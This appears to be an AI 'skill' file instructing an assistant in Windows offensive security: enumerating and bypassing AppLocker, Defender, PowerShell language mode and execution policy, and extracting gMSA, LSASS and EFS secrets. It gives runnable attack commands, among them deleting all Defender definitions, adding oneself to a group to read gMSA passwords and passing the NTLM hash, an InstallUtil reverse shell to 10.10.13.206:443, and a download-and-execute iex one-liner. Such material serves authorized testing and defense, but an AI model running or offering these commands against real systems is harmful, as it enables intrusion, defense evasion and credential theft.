---
name: windows-security-enumeration
description: How to enumerate and assess Windows security controls including AppLocker, credentials storage (SAM, LSASS, LSA), Microsoft Defender, EFS, gMSA, LAPS, PowerShell modes, SSPI, and UAC. Use this skill whenever the user mentions Windows security assessment, penetration testing, AppLocker bypass, credential enumeration, EFS decryption, gMSA password extraction, LAPS, PowerShell constrained mode, execution policy bypass, or any Windows security control evaluation. Trigger for authorized security testing, red teaming, or security assessment tasks involving Windows systems.
---

# Windows Security Controls Enumeration

This skill helps you enumerate and assess Windows security controls for authorized security testing and penetration assessment. Use the appropriate section based on your assessment goals.

## Quick Reference

| Control | Check Command | Bypass Consideration |
|---------|---------------|---------------------|
| AppLocker | `Get-AppLockerPolicy -Effective -xml` | Writable folders, LOLBAS, DLL enforcement |
| Defender | `Get-MpComputerStatus` | Remove definitions, process injection |
| EFS | Check `C:\users\<user>\appdata\roaming\Microsoft\Protect` | Token impersonation, password knowledge |
| gMSA | `netexec ldap <DC> --gmsa` | ACL chaining, ReadGMSAPassword |
| LAPS | Query AD for local admin passwords | ACL permissions |
| PS Constrained Mode | `$ExecutionContext.SessionState.LanguageMode` | PSv2, PSByPassCLM, ReflectivePick |
| PS Execution Policy | `Get-ExecutionPolicy` | Multiple bypass methods |

---

## AppLocker Policy

AppLocker is Microsoft's application whitelisting solution that controls which applications and files users can run.

### Check AppLocker Configuration

```powershell
# Get effective policy in XML format
Get-AppLockerPolicy -Effective -xml

# Get rule collections
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Access rule collections object
$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

**Registry location for AppLocker policies:**
```
HKLM\Software\Policies\Microsoft\Windows\SrpV2
```

### AppLocker Bypass Considerations

**Writable folders** that may bypass AppLocker if System32 or Windows directories are allowed:
- `C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`
- `C:\Windows\System32\spool\drivers\color`
- `C:\Windows\Tasks`
- `C:\windows\tracing`

**Common bypass vectors:**
- LOLBAS (Living Off The Land Binaries and Scripts) - trusted binaries
- Poorly written rules (e.g., `%OSDRIVE%*\allowed*` allows creating `allowed` folder anywhere)
- Alternative PowerShell locations: `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`, `PowerShell_ISE.exe`
- DLL enforcement is rarely enabled - DLLs can be used as backdoors
- ReflectivePick or SharpPick to execute PowerShell in any process

---

## Credentials Storage

### Security Accounts Manager (SAM)

Local credentials are stored in the SAM file with hashed passwords.

### Local Security Authority (LSA) - LSASS

LSASS stores credentials in memory for Single Sign-On:
- Kerberos tickets
- NT and LM hashes
- Easily decrypted passwords

LSA administers local security policy, authentication, and access tokens. It checks credentials in SAM for local logins and communicates with domain controllers for domain authentication.

### LSA Secrets

LSA may store credentials on disk:
- Active Directory computer account password
- Windows service account passwords
- Scheduled task passwords
- IIS application passwords

### NTDS.dit

The Active Directory database, present only on Domain Controllers.

---

## Microsoft Defender

Microsoft Defender is the built-in antivirus in Windows 10/11 and Windows Server. It blocks common pentesting tools like WinPEAS.

### Check Defender Status

```powershell
# Check Defender status
Get-MpComputerStatus

# Key value: RealTimeProtectionEnabled
```

**Example output:**
```
AntispywareEnabled              : True
AntivirusEnabled                : True
RealTimeProtectionEnabled       : True
```

### Defender Enumeration Commands

```powershell
# List antivirus products
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct

# Query Defender service
sc query windefend

# Remove all Defender definitions (useful for offline machines)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

---

## Encrypted File System (EFS)

EFS uses symmetric File Encryption Keys (FEK) encrypted with the user's public key, stored in the file's $EFS alternative data stream.

### Key EFS Concepts

- **FEK**: Symmetric key for file encryption
- **Public key**: Encrypts the FEK, stored in $EFS stream
- **Private key**: Decrypts the FEK for access
- **Automatic decryption**: Occurs when copying to FAT32 or network transmission via SMB/CIFS

### Check EFS Configuration

```powershell
# Check if user has used EFS
# Look for: C:\users\<username>\appdata\roaming\Microsoft\Protect

# Check who has access to a file
cipher /c <file>

# Encrypt all files in folder
cipher /e

# Decrypt all files in folder
cipher /d
```

### EFS Decryption Scenarios

**As Authority System:**
- Requires victim user to be running a process
- Use Meterpreter: `impersonate_token` (incognito) or `migrate` to user's process

**With User Password:**
- Use Mimikatz to decrypt EFS files
- Reference: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files

---

## Group Managed Service Accounts (gMSA)

gMSAs simplify service account management with automatic password rotation and enhanced security.

### gMSA Features

- **Automatic Password Management**: 240-character password, auto-changes per policy
- **Enhanced Security**: No lockouts, no interactive logins
- **Multiple Host Support**: Shared across servers
- **Scheduled Task Capability**: Unlike regular managed service accounts
- **SPN Management**: Auto-updates with sAMaccount/DNS changes

### gMSA Password Storage

- Stored in LDAP property: `msDS-ManagedPassword`
- Auto-reset every 30 days by Domain Controllers
- Encrypted as MSDS-MANAGEDPASSWORD_BLOB
- Requires LDAPS or authenticated connection with 'Sealing & Secure'

### Read gMSA Password

```bash
# Using GMSAPasswordReader
/GMSAPasswordReader --AccountName <accountname>

# Using NetExec (automates extraction and NTLM conversion)
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Output: Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

### ACL Chaining Attack (GenericAll -> ReadGMSAPassword)

**Workflow:**

1. **Discover path** with BloodHound (mark foothold principals as Owned)
   - Look for: GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2. **Add yourself to intermediate group:**
   ```bash
   bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
   ```

3. **Read gMSA password via LDAP:**
   ```bash
   netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
   ```

4. **Authenticate as gMSA:**
   ```bash
   # SMB / WinRM using NTLM hash
   netexec smb <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
   netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
   ```

**Notes:**
- LDAP reads require sealing (LDAPS/sign+seal)
- Check gMSA group membership (e.g., Remote Management Users) for lateral movement
- gMSAs often have local rights like WinRM

---

## LAPS (Local Administrator Password Solution)

LAPS manages local Administrator passwords with randomized, unique, regularly-changed credentials stored in Active Directory.

### Key Points

- Passwords are randomized and unique per machine
- Regularly changed per policy
- Stored centrally in Active Directory
- Access restricted through ACLs
- Requires sufficient permissions to read local admin passwords

---

## PowerShell Constrained Language Mode

Constrained Language Mode locks down PowerShell features needed for effective scripting.

### Check Language Mode

```powershell
$ExecutionContext.SessionState.LanguageMode
# Values: FullLanguage or ConstrainedLanguage
```

### Bypass Methods

**Easy bypass (older Windows):**
```powershell
Powershell -version 2
```

**PSByPassCLM (current Windows):**
- Compile with .NET 4.5
- Add reference: `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`

**Direct bypass:**
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

**Reverse shell:**
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

**Alternative:** Use ReflectivePick or SharpPick to execute PowerShell in any process.

---

## PowerShell Execution Policy

Default execution policy is **Restricted**. Multiple bypass methods available.

### Bypass Methods

```powershell
# 1. Copy and paste in interactive console
# 2. Read and Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -

# 3. Invoke-Expression
Get-Content .runme.ps1 | Invoke-Expression

# 4. Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1

# 5. Change user execution policy
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy UnRestricted

# 6. Change for this session
Set-ExecutionPolicy Bypass -Scope Process

# 7. Download and execute
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"

# 8. Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"

# 9. Use EncodedCommand
$command = "Write-Host 'My voice is my passport, verify me.'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand
```

---

## Security Support Provider Interface (SSPI)

SSPI is the API for user authentication, negotiating protocols between machines.

### Main Security Support Providers (SSPs)

| SSP | Purpose | Location |
|-----|---------|----------|
| **Kerberos** | Preferred method | `%windir%\System32\kerberos.dll` |
| **NTLMv1/v2** | Compatibility | `%windir%\System32\msv1_0.dll` |
| **Digest** | Web servers, LDAP (MD5 hash) | `%windir%\System32\Wdigest.dll` |
| **Schannel** | SSL/TLS | `%windir%\System32\Schannel.dll` |
| **Negotiate** | Protocol negotiation | `%windir%\System32\lsasrv.dll` |

---

## UAC (User Account Control)

UAC enables consent prompts for elevated activities.

---

## References

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – gMSA via rights chaining](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [Mimikatz EFS Decryption](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [PowerShell Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)
- [15 Ways to Bypass PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [PowerShell Executables File System Locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)
- [Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
